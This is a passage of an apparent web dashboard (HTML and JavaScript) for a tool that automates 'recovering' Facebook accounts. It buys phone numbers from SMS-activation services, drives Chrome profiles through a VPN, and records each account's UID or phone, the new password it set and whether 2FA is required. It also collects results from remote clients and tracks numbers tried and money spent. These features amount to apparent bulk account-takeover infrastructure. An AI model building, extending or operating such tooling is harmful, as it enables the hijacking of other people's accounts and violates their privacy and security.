                        <path stroke-linecap="round" stroke-linejoin="round" d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 002 2h2a2 2 0 002-2z" />
                    </svg>
                    Daily Recovery Analytics
                </div>
                <div id="stats-grid">
                    <!-- Dynamic stats cards will go here -->
                    <div style="text-align: center; color: var(--text-muted); padding: 1rem; grid-column: 1 / -1;">No daily history recorded yet.</div>
                </div>
            </div>
        </div>

    <!-- Summary Modal -->
    <div id="summary-modal" style="position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); display: none; justify-content: center; align-items: center; z-index: 10000; opacity: 0; transition: opacity 0.3s ease;">
        <div class="glass-panel" style="max-width: 480px; width: 90%; gap: 1.5rem; border: 1px solid rgba(99, 102, 241, 0.25); box-shadow: 0 20px 50px rgba(0,0,0,0.5); padding: 2rem;">
            <div class="panel-title" style="border: none; font-size: 1.5rem; justify-content: center; color: var(--success-color); padding-bottom: 0; margin-bottom: 0.5rem;">
                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5" style="width: 28px; height: 28px; stroke: var(--success-color); margin-right: 0.5rem; vertical-align: middle;">
                    <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
                Session Summary
            </div>
            
            <p style="text-align: center; color: var(--text-muted); font-size: 0.95rem; margin-bottom: 1.5rem;">The automation run has ended. Here are your stats:</p>
            
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin: 1rem 0;">
                <div style="background: rgba(255,255,255,0.02); border: 1px solid var(--border-color); border-radius: 8px; padding: 0.75rem; text-align: center;">
                    <div style="font-size: 0.75rem; color: var(--text-muted); text-transform: uppercase;">Duration</div>
                    <div id="modal-duration" style="font-size: 1.1rem; font-weight: 600; margin-top: 0.25rem;">0m 0s</div>
                </div>
                <div style="background: rgba(255,255,255,0.02); border: 1px solid var(--border-color); border-radius: 8px; padding: 0.75rem; text-align: center;">
                    <div style="font-size: 0.75rem; color: var(--text-muted); text-transform: uppercase;">Recovered</div>
                    <div id="modal-recovered" style="font-size: 1.25rem; font-weight: 700; color: var(--success-color); margin-top: 0.15rem;">0</div>
                </div>
                <div style="background: rgba(255,255,255,0.02); border: 1px solid var(--border-color); border-radius: 8px; padding: 0.75rem; text-align: center;">
                    <div style="font-size: 0.75rem; color: var(--text-muted); text-transform: uppercase;">Numbers Tried</div>
                    <div id="modal-tried" style="font-size: 1.1rem; font-weight: 600; margin-top: 0.25rem;">0</div>
                </div>
                <div style="background: rgba(255,255,255,0.02); border: 1px solid var(--border-color); border-radius: 8px; padding: 0.75rem; text-align: center;">
                    <div style="font-size: 0.75rem; color: var(--text-muted); text-transform: uppercase;">Amount Spent</div>
                    <div id="modal-spent" style="font-size: 1.1rem; font-weight: 600; color: #f59e0b; margin-top: 0.25rem;">$0.00</div>
                </div>
            </div>
            
            <button class="btn btn-primary" onclick="closeSummaryModal()" style="margin-top: 1.5rem; width: 100%;">Done</button>
        </div>
    </div>

        <!-- Accounts table -->
        <div class="bottom-section">
            <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 0.5rem;">
                <div class="panel-title" style="border: none; padding: 0; font-size: 1.4rem; display: flex; align-items: center; gap: 0.75rem; flex-wrap: wrap;">
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                    </svg>
                    <span>Recovered Accounts</span>
                    <span id="filter-badge" style="display: none; font-size: 0.75rem; padding: 0.2rem 0.6rem; border-radius: 20px; background: rgba(99, 102, 241, 0.15); border: 1px solid var(--primary-color); color: #818cf8; font-weight: 600; cursor: pointer; display: inline-flex; align-items: center; gap: 0.25rem;" onclick="clearDateFilter(event)">
                        Filtered: <span id="filter-date-text"></span> 
                        <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5" style="margin-left: 0.15rem; display: inline-block;">
                            <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" />
                        </svg>
                    </span>
                </div>
                <div style="display: flex; align-items: center; gap: 0.5rem; flex-wrap: wrap;">
                    <select id="session-select" onchange="onSessionSelect()" style="width: auto; font-size: 0.8rem; padding: 0.5rem 0.7rem; background: rgba(0,0,0,0.25); border: 1px solid var(--border-color); border-radius: 8px; color: var(--text-main); font-family: var(--font-main); outline: none;">
                        <option value="">All sessions</option>
                    </select>
                    <button class="btn btn-primary" style="width: auto; font-size: 0.8rem; padding: 0.5rem 1rem;" onclick="downloadAccounts()" title="Download the recovered accounts file for the selected session">Download</button>
                    <button class="btn btn-secondary" style="width: auto; font-size: 0.8rem; padding: 0.5rem 1rem;" onclick="clearAccounts()">Clear History</button>
                </div>
            </div>
            
            <div class="table-container">
                <table>
                    <thead>
                        <tr>
                            <th style="width: 50px;">No</th>
                            <th>Recovered Time</th>
                            <th>Chrome Profile</th>
                            <th>Facebook UID / Phone</th>
                            <th>New Password</th>
                            <th>2FA Required</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody id="accounts-tbody">
                        <tr>
                            <td colspan="7" style="text-align: center; color: var(--text-muted); padding: 2rem;">No recovered accounts found yet. Running automation successfully will add items here.</td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>
    </div>

    <div class="toast" id="toast">
        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
            <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zm-3.97-3.03a.75.75 0 0 0-1.08.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-.01-1.05z"/>
        </svg>
        <span id="toast-text">Action successful</span>
    </div>

    <script>
        let eventSource = null;

        // ===== Auth: global service kill switch (owner only) =====
        let serviceLocked = false;
        function refreshServiceButton() {
            const btn = document.getElementById('serviceBtn');
            if (!btn) return; // not the owner
            fetch('/api/service').then(r => r.json()).then(s => {
                serviceLocked = !!s.locked;
                const label = document.getElementById('serviceBtnLabel');
                if (serviceLocked) {
                    btn.className = 'header-btn svc-locked';
                    label.textContent = 'Service: SUSPENDED';
                    btn.title = 'Service is suspended for everyone but you. Click to resume.';
                } else {
                    btn.className = 'header-btn svc-active';
                    label.textContent = 'Service: Active';
                    btn.title = 'Service is live. Click to suspend all other users instantly.';
                }
            });
        }
        function toggleService() {
            const willLock = !serviceLocked;
            const msg = willLock
                ? 'Suspend the ENTIRE service now? Every other user is logged out immediately and cannot sign back in until you resume. You keep full access.'
                : 'Resume the service so users can log in again?';
            if (!confirm(msg)) return;
            fetch('/api/service', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({locked: willLock})
            }).then(r => r.json()).then(d => {
                refreshServiceButton();
                if (typeof showToast === 'function') showToast(d.message, d.status === 'success' ? 'success' : 'error');
            });
        }

        // ===== Show/hide password fields =====
        function togglePw(id, btn) {
            const el = document.getElementById(id);
            if (!el) return;
            if (el.type === 'password') { el.type = 'text'; btn.textContent = 'Hide'; }
            else { el.type = 'password'; btn.textContent = 'Show'; }
        }

        // ===== Owner: isolated instance manager =====
        function openInstancesModal() {
            document.getElementById('instancesModal').classList.add('open');
            loadInstances();
        }
        function closeInstancesModal() {
            document.getElementById('instancesModal').classList.remove('open');
        }
        function setInstancesMsg(text, ok) {
            const el = document.getElementById('instances_msg');
            el.textContent = text || '';
            el.className = 'modal-msg ' + (text ? (ok ? 'ok' : 'err') : '');
        }
        function loadInstances() {
            fetch('/api/instances').then(r => r.json()).then(list => {
                const tb = document.getElementById('instances_tbody');
                tb.innerHTML = '';
                if (!list.length) {
                    tb.innerHTML = '<tr><td colspan="4" style="color:var(--text-muted);">No instances yet. Create one above.</td></tr>';
                    return;
                }
                list.forEach(it => {
                    const tr = document.createElement('tr');
                    const status = it.running
                        ? '<span class="badge badge-on">Running</span>'
                        : '<span class="badge badge-off">Stopped</span>';
                    const openBtn = it.running
                        ? '<button class="row-action" onclick="openInstance(' + it.port + ')">Open</button>'
                        : '';
                    const startStop = it.running
                        ? '<button class="row-action" onclick="stopInstance(\\'' + it.name + '\\')">Stop</button>'
                        : '<button class="row-action" onclick="startInstance(\\'' + it.name + '\\')">Start</button>';
                    tr.innerHTML =
                        '<td>' + it.name + '</td>' +
                        '<td>' + it.port + '</td>' +
                        '<td>' + status + '</td>' +
                        '<td>' + openBtn + startStop +
                            '<button class="row-action danger" onclick="deleteInstance(\\'' + it.name + '\\')">Delete</button>' +
                        '</td>';
                    tb.appendChild(tr);
                });
            }).catch(() => setInstancesMsg('Failed to load instances.', false));
        }
        function openInstance(port) {
            window.open(location.protocol + '//' + location.hostname + ':' + port + '/', '_blank');
        }
        function createInstance() {
            const name = document.getElementById('ni_name').value.trim();
            const port = document.getElementById('ni_port').value.trim();
            if (!name) { setInstancesMsg('Enter an instance name.', false); return; }
            setInstancesMsg('Creating instance...', true);
            const body = { name };
            if (port) body.port = port;
            fetch('/api/instances', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(body)
            }).then(r => r.json()).then(d => {
                setInstancesMsg(d.message, d.status === 'success');
                if (d.status === 'success') {
                    document.getElementById('ni_name').value = '';
                    document.getElementById('ni_port').value = '';
                    setTimeout(loadInstances, 1500);
                }
            });
        }
        function startInstance(name) {
            fetch('/api/instances/' + encodeURIComponent(name) + '/start', {method: 'POST'})
                .then(r => r.json()).then(d => { setInstancesMsg(d.message, d.status === 'success'); setTimeout(loadInstances, 1500); });
        }
        function stopInstance(name) {
            fetch('/api/instances/' + encodeURIComponent(name) + '/stop', {method: 'POST'})
                .then(r => r.json()).then(d => { setInstancesMsg(d.message, d.status === 'success'); setTimeout(loadInstances, 800); });
        }
        function deleteInstance(name) {
            if (!confirm('Delete instance "' + name + '"? Its accounts, config and results are permanently removed.')) return;
            fetch('/api/instances/' + encodeURIComponent(name), {method: 'DELETE'})
                .then(r => r.json()).then(d => { setInstancesMsg(d.message, d.status === 'success'); loadInstances(); });
        }

        // Copy helper that also works on insecure origins (plain HTTP / IP),
        // where navigator.clipboard is unavailable.
        function copyText(text, btn) {
            const done = () => {
                if (btn) { const t = btn.textContent; btn.textContent = 'Copied!'; setTimeout(() => { btn.textContent = t; }, 1200); }
            };
            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(text).then(done).catch(() => fallbackCopy(text, done));
            } else {
                fallbackCopy(text, done);
            }
        }
        function fallbackCopy(text, done) {
            const ta = document.createElement('textarea');
            ta.value = text;
            ta.style.position = 'fixed';
            ta.style.top = '-1000px';
            document.body.appendChild(ta);
            ta.focus(); ta.select();
            try { document.execCommand('copy'); if (done) done(); } catch (e) {}
            document.body.removeChild(ta);
        }

        // ===== Owner: clients running on their own PC =====
        function openClientsModal() {
            document.getElementById('clientsModal').classList.add('open');
            loadClients();
        }
        function closeClientsModal() {
            document.getElementById('clientsModal').classList.remove('open');
        }
        function setClientsMsg(text, ok) {
            const el = document.getElementById('clients_msg');
            el.textContent = text || '';
            el.className = 'modal-msg ' + (text ? (ok ? 'ok' : 'err') : '');
        }
        function timeAgo(ts) {
            if (!ts) return 'never';
            const s = Math.floor(Date.now() / 1000) - ts;
            if (s < 60) return s + 's ago';
            if (s < 3600) return Math.floor(s / 60) + 'm ago';
            if (s < 86400) return Math.floor(s / 3600) + 'h ago';
            return Math.floor(s / 86400) + 'd ago';
        }
        function loadClients() {
            fetch('/api/clients').then(r => r.json()).then(list => {
                const tb = document.getElementById('clients_tbody');
                tb.innerHTML = '';
                if (!list.length) {
                    tb.innerHTML = '<tr><td colspan="5" style="color:var(--text-muted);">No clients yet. Run make_client.bat to create one.</td></tr>';
                    return;
                }
                list.forEach(c => {
                    const tr = document.createElement('tr');
                    const status = c.enabled ? '<span class="badge badge-on">Active</span>' : '<span class="badge badge-off">Disabled</span>';
                    const toggleLabel = c.enabled ? 'Disable' : 'Enable';
                    tr.innerHTML =
                        '<td>' + c.client_id + '</td>' +
                        '<td>' + status + '</td>' +
                        '<td>' + timeAgo(c.last_seen) + '</td>' +
                        '<td>' + (c.last_count || 0) + '</td>' +
                        '<td>' +
                            '<button class="row-action" onclick="showClientKey(\\'' + c.client_id + '\\')">Key</button>' +
                            '<button class="row-action" onclick="viewClientLog(\\'' + c.client_id + '\\')">Log</button>' +
                            (c.last_count ? '<button class="row-action" onclick="downloadClient(\\'' + c.client_id + '\\')">Download</button>' : '') +
                            '<button class="row-action" onclick="toggleClient(\\'' + c.client_id + '\\')">' + toggleLabel + '</button>' +
                            '<button class="row-action danger" onclick="deleteClient(\\'' + c.client_id + '\\')">Delete</button>' +
                        '</td>';
                    tb.appendChild(tr);
                });
            }).catch(() => setClientsMsg('Failed to load clients.', false));
        }
        function createClient() {
            const name = document.getElementById('nc_name').value.trim();
            if (!name) { setClientsMsg('Enter a client name.', false); return; }
            fetch('/api/clients', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({client_id: name})
            }).then(r => r.json()).then(d => {
                if (d.status === 'success') {
                    setClientsMsg('', true);
                    document.getElementById('nc_name').value = '';
                    document.getElementById('ck_name').textContent = d.client_id;
                    document.getElementById('ck_key').textContent = d.key;
                    document.getElementById('clients_key_box').style.display = 'block';
                    loadClients();
                } else { setClientsMsg(d.message, false); }
            });
        }
        function showClientKey(id) {
            fetch('/api/clients/' + encodeURIComponent(id) + '/key').then(r => r.json()).then(d => {
                if (d.key) {
                    document.getElementById('ck_name').textContent = d.client_id;
                    document.getElementById('ck_key').textContent = d.key;
                    document.getElementById('clients_key_box').style.display = 'block';
                    setClientsMsg('', true);
                } else { setClientsMsg(d.message || 'No key found.', false); }
            });
        }
        function toggleClient(id) {
            fetch('/api/clients/' + encodeURIComponent(id) + '/toggle', {method: 'POST'})
                .then(r => r.json()).then(d => { setClientsMsg(d.message, d.status === 'success'); loadClients(); });
        }
        function deleteClient(id) {
            if (!confirm('Delete client "' + id + '"? They can no longer upload. Their already-collected file stays in your folder.')) return;
            fetch('/api/clients/' + encodeURIComponent(id), {method: 'DELETE'})
                .then(r => r.json()).then(d => { setClientsMsg(d.message, d.status === 'success'); loadClients(); });
        }
        function downloadClient(id) {
            const a = document.createElement('a');
            a.href = '/api/clients/' + encodeURIComponent(id) + '/download';
            document.body.appendChild(a); a.click(); a.remove();
        }
        function openActivityModal() {
            document.getElementById('activityModal').classList.add('open');
            loadActivity();
        }
        function closeActivityModal() {
            document.getElementById('activityModal').classList.remove('open');
        }
        function loadActivity() {
            fetch('/api/activity').then(r => r.json()).then(d => {
                document.getElementById('act_clients').textContent = d.summary.clients;
                document.getElementById('act_active').textContent = d.summary.active;
                document.getElementById('act_recovered').textContent = d.summary.total_recovered;
                const tb = document.getElementById('activity_tbody');
                tb.innerHTML = '';
                if (!d.events || !d.events.length) {
                    tb.innerHTML = '<tr><td colspan="3" style="color:var(--text-muted);">No activity yet.</td></tr>';
                    return;
                }
                d.events.forEach(e => {
                    const isDisable = /disabled/i.test(e.message);
                    const isRecover = /recovered/i.test(e.message);
                    const color = isDisable ? '#fca5a5' : (isRecover ? '#6ee7b7' : 'var(--text-main)');
                    const tr = document.createElement('tr');
                    tr.innerHTML =
                        '<td style="color:var(--text-muted);font-size:0.8rem;">' + e.time + '</td>' +
                        '<td><span class="badge badge-user">' + e.client + '</span></td>' +
                        '<td style="color:' + color + ';">' + e.message + '</td>';
                    tb.appendChild(tr);
                });
            }).catch(() => { document.getElementById('activity_msg').textContent = 'Failed to load activity.'; });
        }
        function viewClientLog(id) {
            document.getElementById('client_log_title').textContent = 'Activity — ' + id;
            document.getElementById('client_log_body').textContent = 'Loading…';
            document.getElementById('clientLogModal').classList.add('open');
            fetch('/api/clients/' + encodeURIComponent(id) + '/log').then(r => r.json()).then(d => {
                const body = document.getElementById('client_log_body');
                body.textContent = (d.lines && d.lines.length) ? d.lines.join('\\n') : 'No activity yet.';
                body.scrollTop = body.scrollHeight;
            }).catch(() => { document.getElementById('client_log_body').textContent = 'Failed to load log.'; });
        }
        function closeClientLog() {
            document.getElementById('clientLogModal').classList.remove('open');
        }

        // ===== Auth: user management + password modals =====
        function openUsersModal() {
            document.getElementById('usersModal').classList.add('open');
            loadUsers();
        }
        function closeUsersModal() {
            document.getElementById('usersModal').classList.remove('open');
        }
        function setUsersMsg(text, ok) {
            const el = document.getElementById('users_msg');
            el.textContent = text || '';
            el.className = 'modal-msg ' + (text ? (ok ? 'ok' : 'err') : '');
        }
        function loadUsers() {
            fetch('/api/users').then(r => r.json()).then(users => {
                const tb = document.getElementById('users_tbody');
                tb.innerHTML = '';
                users.forEach(u => {
                    const tr = document.createElement('tr');
                    let roleBadge;
                    if (u.role === 'owner') roleBadge = '<span class="badge badge-owner">Owner</span>';
                    else if (u.role === 'admin') roleBadge = '<span class="badge badge-admin">Admin</span>';
                    else roleBadge = '<span class="badge badge-user">User</span>';
                    const statusBadge = u.enabled
                        ? '<span class="badge badge-on">Active</span>'
                        : '<span class="badge badge-off">Disabled</span>';
                    const toggleLabel = u.enabled ? 'Disable' : 'Enable';
                    // The owner row is protected - no disable/delete buttons
                    const actions = (u.role === 'owner')
                        ? '<span style="color:var(--text-muted);font-size:0.78rem;">Protected</span>'
                        : '<button class="row-action" onclick="toggleUser(\\'' + u.username + '\\')">' + toggleLabel + '</button>' +
                          '<button class="row-action danger" onclick="deleteUser(\\'' + u.username + '\\')">Delete</button>';
                    tr.innerHTML =
                        '<td>' + u.username + '</td>' +
                        '<td>' + roleBadge + '</td>' +
                        '<td>' + statusBadge + '</td>' +
                        '<td>' + actions + '</td>';
                    tb.appendChild(tr);
                });
            }).catch(() => setUsersMsg('Failed to load users.', false));
        }
        function createUser() {
            const username = document.getElementById('nu_username').value.trim();
            const password = document.getElementById('nu_password').value;
            const role = document.getElementById('nu_role').value;
            if (!username || !password) { setUsersMsg('Username and password required.', false); return; }
            fetch('/api/users', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({username, password, role})
            }).then(r => r.json()).then(d => {
                if (d.status === 'success') {
                    setUsersMsg(d.message, true);
                    document.getElementById('nu_username').value = '';
                    document.getElementById('nu_password').value = '';
                    loadUsers();
                } else { setUsersMsg(d.message, false); }
            });
        }
        function toggleUser(username) {
            fetch('/api/users/' + encodeURIComponent(username) + '/toggle', {method: 'POST'})
                .then(r => r.json()).then(d => {
                    setUsersMsg(d.message, d.status === 'success');
                    loadUsers();
                });
        }
        function deleteUser(username) {
            if (!confirm('Delete user "' + username + '"? This cannot be undone.')) return;
            fetch('/api/users/' + encodeURIComponent(username), {method: 'DELETE'})
                .then(r => r.json()).then(d => {
                    setUsersMsg(d.message, d.status === 'success');
                    loadUsers();
                });
        }
        function openPasswordModal() {
            document.getElementById('passwordModal').classList.add('open');
            document.getElementById('pw_msg').textContent = '';
        }
        function closePasswordModal() {
            document.getElementById('passwordModal').classList.remove('open');
        }
        function changePassword() {
            const cur = document.getElementById('pw_current').value;
            const nw = document.getElementById('pw_new').value;
            const el = document.getElementById('pw_msg');
            fetch('/api/change_password', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({current_password: cur, new_password: nw})
            }).then(r => r.json()).then(d => {
                el.className = 'modal-msg ' + (d.status === 'success' ? 'ok' : 'err');
                el.textContent = d.message;
                if (d.status === 'success') {
                    document.getElementById('pw_current').value = '';
                    document.getElementById('pw_new').value = '';
                }
            });
        }

        // On Page Load
        window.addEventListener('load', () => {
            loadConfig();
            loadAccounts();
            loadStats();
            checkStatus();
            refreshServiceButton();
            // Polling status
            setInterval(checkStatus, 3000);
        });

        function showToast(text, type = 'success') {
            const toast = document.getElementById('toast');
            const toastText = document.getElementById('toast-text');
            toastText.textContent = text;
            
            if (type === 'danger') {
                toast.style.background = 'rgba(239, 68, 68, 0.95)';
            } else {
                toast.style.background = 'rgba(16, 185, 129, 0.95)';
            }
            
            toast.classList.add('show');
            setTimeout(() => {
                toast.classList.remove('show');
            }, 3000);
        }

        function toggleAutoLoginFields() {
            const check = document.getElementById('auto_login');
            const container = document.getElementById('auto-login-fields');
            if (check.checked) {
                container.style.display = 'flex';
            } else {
                container.style.display = 'none';
            }
        }

        function loadConfig() {
            fetch('/api/config')
                .then(res => res.json())
                .then(data => {
                    document.getElementById('chrome_debug_url').value = data.chrome_debug_url || '';
                    document.getElementById('chrome_profile_name').value = data.chrome_profile_name || '';
                    document.getElementById('service_text').value = data.service_text || '';
                    document.getElementById('country_text').value = data.country_text || '';
                    document.getElementById('buy_text').value = data.buy_text || '';
                    document.getElementById('min_price').value = data.min_price !== undefined ? data.min_price : 0.01;
                    document.getElementById('max_price').value = data.max_price !== undefined ? data.max_price : 0.15;
                    document.getElementById('new_password').value = data.new_password || '';
                    document.getElementById('target_url').value = data.target_url || '';
                    document.getElementById('multiple_accounts').checked = !!data.multiple_accounts;
                    document.getElementById('confirm_before_buy').checked = !!data.confirm_before_buy;
                    document.getElementById('vpn_connection_name').value = data.vpn_connection_name || '';
                    
                    document.getElementById('auto_login').checked = !!data.auto_login;
                    document.getElementById('hero_username').value = data.hero_username || '';
                    document.getElementById('hero_password').value = data.hero_password || '';
                    document.getElementById('use_api').checked = !!data.use_api;
                    document.getElementById('api_provider').value = data.api_provider || 'sms-activate';
                    document.getElementById('api_base_url').value = data.api_base_url || '';
                    document.getElementById('api_key').value = data.api_key || '';
                    document.getElementById('api_service_code').value = data.api_service_code || '';
                    document.getElementById('api_country_code').value = data.api_country_code || '0';
                    toggleAutoLoginFields();
                    toggleApiFields();
                });
        }

        function toggleApiFields() {
            const on = document.getElementById('use_api').checked;
            document.getElementById('api-fields').style.display = on ? 'flex' : 'none';
        }
        function onApiProviderChange() {
            const p = document.getElementById('api_provider').value;
            const urlEl = document.getElementById('api_base_url');
            if (p === 'claudeotp') {
                if (!urlEl.value || urlEl.value.indexOf('sms-activate') !== -1) urlEl.value = 'https://claudeotp.com/api/v1';
                document.getElementById('api_service_code').placeholder = 'service_id (number, from /services)';
                document.getElementById('api_country_code').placeholder = 'country id (number)';
            } else {
                document.getElementById('api_service_code').placeholder = 'fb';
                document.getElementById('api_country_code').placeholder = '0';
            }
        }

        function saveConfig(silent = false) {
            const config = {
                chrome_debug_url: document.getElementById('chrome_debug_url').value,
                chrome_profile_name: document.getElementById('chrome_profile_name').value,
                service_text: document.getElementById('service_text').value,
                country_text: document.getElementById('country_text').value,
                buy_text: document.getElementById('buy_text').value,
                min_price: parseFloat(document.getElementById('min_price').value) || 0.01,
                max_price: parseFloat(document.getElementById('max_price').value) || 0.15,
                new_password: document.getElementById('new_password').value,
                target_url: document.getElementById('target_url').value,
                multiple_accounts: document.getElementById('multiple_accounts').checked,
                confirm_before_buy: document.getElementById('confirm_before_buy').checked,
                vpn_connection_name: document.getElementById('vpn_connection_name').value,
                
                auto_login: document.getElementById('auto_login').checked,
                hero_username: document.getElementById('hero_username').value,
                hero_password: document.getElementById('hero_password').value,
                use_api: document.getElementById('use_api').checked,
                api_provider: document.getElementById('api_provider').value,
                api_base_url: document.getElementById('api_base_url').value,
                api_key: document.getElementById('api_key').value,
                api_service_code: document.getElementById('api_service_code').value,
                api_country_code: document.getElementById('api_country_code').value
            };

            return fetch('/api/config', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(config)
            })
            .then(res => res.json())
            .then(data => {
                if (data.status === 'success') {
                    if (!silent) showToast('Configuration saved successfully!');
                } else {
                    showToast('Failed to save configuration.', 'danger');
                }
            });
        }

        function launchChrome() {
            const launchBtn = document.getElementById('launch-chrome-btn');
            launchBtn.disabled = true;
            launchBtn.textContent = 'Launching...';
            
            fetch('/api/launch_chrome', { method: 'POST' })
                .then(res => res.json())
                .then(data => {
                    launchBtn.disabled = false;
                    launchBtn.textContent = 'Launch Profile';
                    
                    if (data.status === 'success') {
                        showToast(`Launched Chrome profile on port ${data.port}!`);
                        // Auto load config update
                        loadConfig();
                    } else {
                        showToast(data.message, 'danger');
                    }
                })
                .catch(err => {
                    launchBtn.disabled = false;
                    launchBtn.textContent = 'Launch Profile';
                    showToast('Network error launching Chrome.', 'danger');
                });
        }


        function killChrome() {
            if (confirm("This will close only the Chrome window used by this instance (its debug port). Other Chrome windows stay open. Proceed?")) {
                const killBtn = document.getElementById('kill-chrome-btn');
                killBtn.disabled = true;
                killBtn.textContent = 'Killing...';
                
                fetch('/api/kill_chrome', { method: 'POST' })
                    .then(res => res.json())
                    .then(data => {
                        killBtn.disabled = false;
                        killBtn.textContent = 'Reset Chrome';
                        if (data.status === 'success') {
                            showToast("All Chrome processes terminated successfully.");
                        } else {
                            showToast(data.message, 'danger');
                        }
                    })
                    .catch(err => {
                        killBtn.disabled = false;
                        killBtn.textContent = 'Reset Chrome';
                        showToast('Error resetting Chrome.', 'danger');
                    });
            }
        }


        let refreshInterval = null;

        function checkStatus() {
            fetch('/api/status')
                .then(res => res.json())
                .then(data => {
                    const statusDot = document.getElementById('status-dot');
                    const statusText = document.getElementById('status-text');
                    const startBtn = document.getElementById('start-btn');
                    const stopBtn = document.getElementById('stop-btn');
                    
                    if (data.is_running) {
                        statusDot.className = 'status-dot running';
                        statusText.textContent = 'Running';
                        startBtn.disabled = true;
                        stopBtn.disabled = false;
                        
                        window.activeElapsed = data.elapsed || 0;
                        window.activeStartTime = data.start_time || null;
                        window.activeSessionRecovered = data.recovered || 0;
                        
                        // Format dynamic running session duration for summary modal
                        const hours = Math.floor(window.activeElapsed / 3600);
                        const minutes = Math.floor((window.activeElapsed % 3600) / 60);
                        const seconds = window.activeElapsed % 60;
                        let parts = [];
                        if (hours > 0) parts.push(`${hours} hour${hours > 1 ? 's' : ''}`);
                        if (minutes > 0 || hours > 0) parts.push(`${minutes} minute${minutes > 1 ? 's' : ''}`);
                        parts.push(`${seconds} second${seconds > 1 ? 's' : ''}`);
                        sessionStats.duration = parts.join(', ');
                        
                        // Start log streaming if not active
                        if (!eventSource) {
                            startLogStream();
                        }
                        
                        // Set up real-time stats/accounts refresh interval
                        if (!refreshInterval) {
                            refreshInterval = setInterval(() => {
                                checkStatus();
                                loadAccounts();
                                loadStats();
                            }, 5000);
                        }
                    } else {
                        statusDot.className = 'status-dot';
                        statusText.textContent = 'Idle';
                        startBtn.disabled = false;
                        stopBtn.disabled = true;
                        
                        window.activeElapsed = 0;
                        window.activeStartTime = null;
                        window.activeSessionRecovered = 0;
                        
                        if (eventSource) {
                            eventSource.close();
                            eventSource = null;
                        }
                        
                        // Clear real-time refresh interval
                        if (refreshInterval) {
                            clearInterval(refreshInterval);
                            refreshInterval = null;
                        }
                    }
                });
        }

        function startAutomation() {
            // Reset stats
            sessionStats = {
                duration: '0m 0s',
                recovered: '0',
                tried: '0',
                spent: '$0.00'
            };
            // Auto-save configuration first
            saveConfig(true).then(() => {
                fetch('/api/start', { method: 'POST' })
                    .then(res => res.json())
                    .then(data => {
                        if (data.status === 'success') {
                            showToast('Automation process started.');
                            checkStatus();
                            // Load accounts periodically
                            setTimeout(loadAccounts, 5000);
                        } else {
                            showToast(data.message, 'danger');
                        }
                    });
            });
        }

        function stopAutomation() {
            fetch('/api/stop', { method: 'POST' })
                .then(res => res.json())
                .then(data => {
                    if (data.status === 'success') {
                        showToast('Stopping automation...', 'danger');
                        checkStatus();
                        loadAccounts();
                    } else {
                        showToast(data.message, 'danger');
                    }
                });
        }

        function clearConsole() {
            const body = document.getElementById('console-body');
            body.innerHTML = '<div class="console-line line-system">[SYSTEM] Console cleared.</div>';
        }

        function startLogStream() {
            if (eventSource) eventSource.close();
            
            eventSource = new EventSource('/stream');
            const consoleBody = document.getElementById('console-body');
            
            eventSource.onmessage = (event) => {
                const line = event.data;
                if (line === '[PING]') return;
                
                // Parse log message style
                let className = 'line-info';
                if (line.includes('✅') || line.includes('SUCCESS') || line.includes('successfully')) {
                    className = 'line-success';
                } else if (line.includes('⚠️') || line.includes('WARNING') || line.includes('Timed out')) {
                    className = 'line-warning';
                } else if (line.includes('❌') || line.includes('Error') || line.includes('FAILED')) {
                    className = 'line-error';
                } else if (line.startsWith('[SYSTEM') || line.startsWith('[OK')) {
                    className = 'line-system';
                } else if (line.includes('🔑') || line.includes('Recovered Account')) {
                    className = 'line-code';
                }
                
                // Add line to terminal
                const lineDiv = document.createElement('div');
                lineDiv.className = `console-line ${className}`;
                lineDiv.textContent = line;
                consoleBody.appendChild(lineDiv);
                
                // Limit terminal lines buffer size (keep last 500)
                while (consoleBody.children.length > 500) {
                    consoleBody.removeChild(consoleBody.firstChild);
                }
                
                // Autoscroll
                if (document.getElementById('autoscroll-check').checked) {
                    consoleBody.scrollTop = consoleBody.scrollHeight;
                }
                
                // Capture stats printed by script
                if (line.includes('Total Time Elapsed')) {
                    sessionStats.duration = line.split(' : ')[1] || '0m 0s';
                } else if (line.includes('Total Accounts Recovered')) {
                    sessionStats.recovered = line.split(': ')[1] || '0';
                } else if (line.includes('Total Numbers Tried')) {
